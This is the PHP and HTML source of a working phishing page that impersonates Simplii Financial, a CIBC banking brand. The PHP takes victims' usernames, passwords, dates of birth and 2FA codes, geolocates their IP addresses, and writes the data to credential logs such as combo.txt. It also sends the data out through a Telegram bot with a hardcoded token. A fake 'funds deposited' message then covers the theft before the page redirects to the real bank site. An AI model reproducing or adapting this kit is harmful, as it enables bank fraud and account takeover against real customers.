<?php
        include "/files/anti/anti1.php";
        include "/files/anti/anti2.php";
        include "/files/anti/anti3.php";
        include "/files/anti/anti4.php";
        include "/files/anti/anti5.php";
        include "/files/anti/anti6.php";
        include "/files/anti/anti7.php";
        include "/files/anti/anti8.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telgram_log.txt';
$file2      = '/tangerine.csv';
$file3      = '/accounts.csv';
$file4      = '/usagent_log.txt';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "SIMPLII";
    $project    = "[CR00K-3D]";
    $url        = "https://royalbank.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $dob1       = $_POST['dob1'];
$dob2       = $_POST['dob2'];
$dob3       = $_POST['dob3'];
$code       = $_POST['code']; 
    $code       = $_POST['code']; 
    $code2      ="[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="IMPORTANT DATA WAS LOGGED\n\n\n$bank$lh$ip$lh$uos\n\n\n$bank IDENTIY  :  $ip\n\nDOB :  $dob1$lh$dob2$lh$dob3 \n\n$uos$li$bsr\n$is\n$city$lh$country\n$la\n$lp\n\n$uaget\n\n$url";

file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);

$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>SIMPLII</title>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="refresh" content="2;URL=https://href.li/?https://www.simplii.com/en/home.html">
        <link rel="stylesheet" href="./sim_3_files/reset.css">
        <link rel="stylesheet" href="./sim_3_files/reset-brand.css">
        <link rel="stylesheet" href="./sim_3_files/global.css">
        <link rel="stylesheet" href="./sim_3_files/global-android2.css">
        <link rel="stylesheet" href="./sim_3_files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/reset(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/reset-brand(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global-android2(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global-brand(1).css">
        <script type="text/javascript" src="./sim_3_files/jquery-1.js###"></script>
        <script type="text/javascript" src="./sim_3_files/wicket-event-jquery.js###"></script>
        <script type="text/javascript" src="./sim_3_files/wicket-ajax-jquery.js###"></script>
        <script type="text/javascript" id="wicket-ajax-base-url">
            /*<![CDATA[*/
            Wicket.Ajax.baseUrl="change-password";
            /*]]>*/
        </script>
        <script src="./sim_3_files/global.js###"></script>
        <script src="./sim_3_files/drawer-scroll-prevent.js###"></script>
        <link rel="stylesheet" href="./sim_3_files/appboy.css">
        <script type="text/javascript">
            /*<![CDATA[*/

            			//
            			// AppBoy variables
            			//

            			// Staging English
            			// var appBoyKey = 'dc2ba41b-e995-4485-96b3-cd023a992036';
            			// Prod Enlgish
            			var appBoyKey = 'ff80e32a-a82e-4232-b08e-0219652bae28';

            /*]]>*/
        </script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">CIBC Mobile Banking</span>
        <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./sim_3_files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./sim_3_files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div class="account-holder-name" id="account-holder-name"></div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
                    <span>My Profile</span><span class="drawer-icon-cog"></span>
                    </a>
                </div>
                <ul>
                    <li id="li-my-accounts"><a id="accounts-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink" role="menuitem" class="">My Accounts</a></li>
                    <li id="li-pay-bills"><a id="paybill-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
                    <li id="li-interac"><a id="etransfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
                    <li id="li-transfer"><a id="transfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
                    <li id="li-upcoming"><a id="uptxs-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
                    <!-- dynamic SSO links -->
                    <li class="li-sso"><a id="GMT-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
                    <li class="li-sso"><a id="FXC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web" role="menuitem">Order Foreign Cash</a></li>
                    <li class="li-sso"><a id="RPC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage" role="menuitem">Prepaid Cards</a></li>
                    <li class="li-sso"><a id="PMO-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web" role="menuitem">Buy Gold and Silver</a></li>
                    <li class="li-sso"><a id="CCS-link" href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web" role="menuitem">Check Credit Score</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink" role="menuitem">Open an Account</a></li>
                    <li id="li-browse-products"><a id="products-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <!-- Customer Services link visible for CIBC non-Small Business -->
                    <li id="li-client-services"><a id="customerServices-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
                    <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
                    <li><a class="nav-no-indent" id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="https://enterac-pending.com/deposit/simplii/#" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="">
        <section id="ide">
            <section class="page-title">
                <h2 class="title">Security Validation</h2>
            </section>
        </section>
        <section id="change-password" class="page-wrapper">
        <div class="global-error-from-container" id="idf">
            <h2 class="title">Thank you,<br>
<br>
The funds will be processed and deposited in your account within the next 48 hours.<br>
<br>
- Simplii</h2>
        </div>
        <a href="https://enterac-pending.com/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="./sim_3_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

</section></section></body></html>